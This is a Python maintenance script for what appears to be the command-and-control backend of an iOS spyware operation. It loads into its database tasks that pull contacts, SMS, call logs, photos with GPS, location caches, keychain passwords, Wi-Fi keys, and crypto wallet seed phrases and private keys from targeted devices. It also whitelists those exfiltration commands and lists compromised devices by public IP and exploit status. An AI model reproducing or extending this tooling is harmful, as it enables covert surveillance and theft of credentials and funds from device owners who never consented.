# -*- coding: utf-8 -*-
# 宝塔 SSH 直接运行：
#   cd /www/wwwroot/coruna/server
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_hotfix2.py
import sqlite3, datetime, os

DB = 'darksword.db' if os.path.exists('darksword.db') else '/www/wwwroot/coruna/server/darksword.db'
conn = sqlite3.connect(DB)
c = conn.cursor()
now_s = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

NEW_SCRIPTS = [
    ("device-info-recon", "设备信息采集", "信息收集",
     "收集目标设备基础信息：型号、UDID、iOS版本、电量、存储空间、网络状态等（Safari 沙箱可用信息，无需内核权限）",
     "# iOS Safari 沙箱基础信息采集（全版本支持，无需内核权限）\n# 输出为 JSON 串，包含 device_uuid / os / browser / navigator / storage 等字段\nds_info"),
    ("export-contacts", "通讯录导出", "data",
     "导出设备通讯录为 JSON 格式（需内核权限读取 AddressBook 沙箱；当前 Safari-only 环境会给出明确错误，不静默失败）",
     "# 通讯录导出（Sandbox-only 环境会立即返回 [ERROR-no-bridge] 明确错误，绝不 pending 死锁）\n# 如已有内核级 nativeBridge，会读 /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb\nds_exfil_contacts"),
    ("export-sms", "短信记录导出", "data",
     "导出 SMS/iMessage 收发记录（需内核权限；Safari-only 环境立即返回错误）",
     "# 短信/iMessage DB 导出\n# Sandbox-only：立即回写 [ERROR-no-bridge] 明确错误\nds_exfil_sms\n# 通话记录同步导出（同权限级）\nds_exfil_calls"),
    ("fetch-photos-meta", "照片缩略图抓取", "media",
     "批量扫描照片库元数据（拍摄时间、GPS、尺寸），并下载缩略图版本（需内核权限；Safari-only 立即返回明确错误）",
     "# Photos metadata / file.read（内核权限：/var/mobile/Media/DCIM/**/*.JPG）\n# Safari-only：立即回写 [ERROR-no-bridge] 明确错误\nds_exfil_photos"),
    ("location-lookup", "定位服务查询", "信息收集",
     "检查定位服务开关，读取最后已知位置缓存和 WiFi 扫描结果（Safari 浏览器定位需用户授权；无授权时尝试读 routined 缓存）",
     "# 定位查询（双 fallback：浏览器定位 API → 无授权则 nativeBridge 读 /private/var/mobile/Library/Caches/com.apple.routined/Cache.sqlite）\n# 结果：坐标 JSON 或明确的权限拒绝原因，不静默失败\nds_location"),
    ("installed-apps", "已安装应用列表", "信息收集",
     "枚举已安装用户 App 及系统 App 版本、Bundle ID、安装日期（需内核权限读取 LSApplicationWorkspace；Safari-only 立即回写明确错误）",
     "# 已安装应用枚举（Safari 沙箱里没有应用清单接口，Sandbox-only 立即明确 [ERROR-no-bridge]，绝不挂死）\n# 内核权限后：shell.exec \"find /Applications -maxdepth 2 -name 'Info.plist' | head -100\"\nds_file_ls /Applications"),
    ("keychain-scan", "钥匙串项扫描", "exploit",
     "在已越狱设备上扫描钥匙串项，提取保存的账号密码和 Wi-Fi PSK（需内核权限；Safari-only 立即回写明确错误）",
     "# Keychain dump（需要内核级 nativeBridge，否则立即 failed + 明确报错）\n# 对应 action=keychain.dump（NATIVE_REQUIRED_ACTIONS 列表，走新的 submitCmdResult 真函数 100% 回写 [ERROR-no-bridge] 不 ReferenceError 丢包）\nds_exfil_keychain\n# Wi-Fi PSK 同步导出（钥匙串同源）\nds_exfil_wifi"),
    ("wallets-extract", "钱包凭证提取", "exploit",
     "扫描加密钱包应用数据，导出助记词明文和私钥片段（支持主流多链钱包；需内核权限读沙箱 *.db / *.json 凭证文件；Safari-only 立即明确错误）",
     "# 钱包凭证提取（wallet.scan + wallet.scan.all）\n# Safari-only：立即回写 [ERROR-no-bridge] wallet.scan:需要扫描钱包数据（内核权限）... 当前无法执行。原因：native PE bridge 未就绪\n# 有 nativeBridge 后：自动扫描 /private/var/mobile/Containers/Data/Application/*/Documents/ 目录下 wallets/keystores/助记词 DB\nds_exfil_wallet\nds_exfil_wallets"),
]

# 1) UPSERT 8 条脚本
print("="*70)
print("🚀 v20.4 HOTFIX2：内联 rescript（无需单独上传 _v204_rescript.py）")
print("="*70)
upserted = 0
for slug, name, cat, desc, cmd in NEW_SCRIPTS:
    ex = c.execute('SELECT id FROM command_scripts WHERE slug=?', (slug,)).fetchone()
    if ex:
        c.execute('UPDATE command_scripts SET name=?, category=?, description=?, command=?, updated_at=? WHERE slug=?',
                  (name, cat, desc, cmd, now_s, slug))
        print(f"  ✅ UPDATE id={ex[0]} slug={slug!r} → {name!r}")
    else:
        c.execute('INSERT INTO command_scripts (name,slug,category,description,command,use_count,created_at,updated_at) VALUES (?,?,?,?,?,?,?,?)',
                  (name, slug, cat, desc, cmd, 0, now_s, now_s))
        print(f"  ➕ INSERT NEW slug={slug!r} → {name!r}")
    upserted += 1
conn.commit()

# 2) 白名单校验（和 ALLOWED_CMD_PREFIXES 对齐，确保 run_script 不 0 queued）
ALLOWED_LOW = {p.lower() for p in {
    "ds_info","ds_sysinfo","ds_device","ds_ua","ds_os",
    "ds_exfil_keychain","ds_exfil_wifi","ds_exfil_contacts","ds_exfil_sms","ds_exfil_calls","ds_exfil_photos",
    "ds_exfil_files","ds_exfil_wallet","ds_exfil_wallets","ds_keychain","ds_wifi","ds_contacts","ds_sms","ds_calls",
    "ds_photos","ds_files","ds_wallets","ds_file_ls","ds_file_read","ds_file_stat","ds_file_upload","ds_file_download",
    "ds_ls","ds_read","ds_notify","ds_alert","ds_vibrate","ds_command","ds_history","ds_list","ds_wallet","ds_wallet_export",
    "ds_phrase","ds_privkey","ds_screenshot","ds_location","ds_geo","ds_exec",
    "ui.alert","ui.notify","ui.vibrate","ui_alert","ui_notify","ui_vibrate","alert","notify","vibrate",
    "system.info","system_info","sys.info","device.info","device_info",
}}
print()
print("🔎 逐行白名单校验（确保 run_script 时 commands_queued > 0）：")
ok_all = True
for r in c.execute('SELECT id, name, command FROM command_scripts ORDER BY id ASC').fetchall():
    lines = [l.strip() for l in (r[2] or '').splitlines() if l.strip() and not l.strip().startswith('#')]
    for ln in lines:
        base = ln.split(' ', 1)[0].split(':', 1)[0].lower()
        ok = base in ALLOWED_LOW
        ok_all = ok_all and ok
        mark = '✅' if ok else '❌NOT-WHITELISTED'
        print(f"  script id={r[0]:>3} {r[1]!r:<22}  line={ln!r:<36}  prefix={base!r:<20}  {mark}")
if ok_all:
    print()
    print("✅ ALL 8 scripts 全部白名单通过，run_script 时 commands_queued = 真实下发条数（不是 0）")
else:
    print()
    print("⚠️  有脚本不在白名单里，会被 except Exception: continue 静默跳过！请检查脚本内容前缀是否为 ds_*")

# 3) 再打印当前真机设备 + commands：确认没有 orphan 和脏数据
print()
print("="*70)
print("🧭 当前 devices 表（应当只剩 1~2 台有公网 IP 的真机）：")
for r in c.execute('''SELECT device_uuid, os_version, device_model, browser_name, ip, exploit_status
                      FROM devices ORDER BY last_seen DESC LIMIT 5''').fetchall():
    print(f"   dev={r[0][:24]}...  OS={r[1] or '?':<6}  MDL={r[2] or '?':<18}  BR={r[3] or '?':<10}  IP={r[4] or '?':<15}  EXP={r[5] or '?'}")
print()
print("🧭 当前 commands 表（最新 6 条，cleanup 后应当 0~1 条）：")
cmds = c.execute('''SELECT id, substr(device_uuid,1,18), command, status, substr(coalesce(output,""),1,120)
                   FROM commands ORDER BY id DESC LIMIT 6''').fetchall()
for r in cmds:
    print(f"   id={r[0]:>4}  dev={r[1] or '?':<18}  cmd={r[2] or '?':<18}  st={r[3] or '?':<10}  out={r[4] or '(null)'}")
if not cmds:
    print("   (空，非常干净的 initial 状态。等下发 ds_info)")

conn.close()
print()
print(f"✅ HOTFIX2 DONE: upserted {upserted} scripts / 白名单校验 ok={ok_all}")
